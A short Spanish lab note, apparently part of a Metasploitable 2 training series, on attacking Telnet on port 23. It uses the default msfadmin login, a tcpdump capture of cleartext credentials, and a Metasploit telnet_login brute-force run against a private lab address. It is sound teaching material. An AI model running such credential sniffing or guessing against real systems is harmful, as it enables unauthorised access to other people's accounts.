# Telnet (puerto 23) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** Telnet ofrece una sesión de terminal remota, pero **sin cifrado** (todo viaja en texto claro, contraseñas incluidas). **Puerto 23**.

**Cómo se explota:** por un lado, credenciales débiles; por otro, al ir en claro, cualquiera en la red puede **capturar las credenciales** con un *sniffer*. Metasploitable además muestra un *banner* que chiva las credenciales por defecto.

## Explotación manual (sin Metasploit)

```bash
telnet 192.168.100.9 23
# login: msfadmin   password: msfadmin

# Capturar credenciales ajenas que viajan en claro (en otra sesión):
sudo tcpdump -i eth0 -A port 23
```

## Explotación con Metasploit

```bash
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 192.168.100.9
set USER_FILE usuarios.txt
set PASS_FILE passwords.txt
run
```
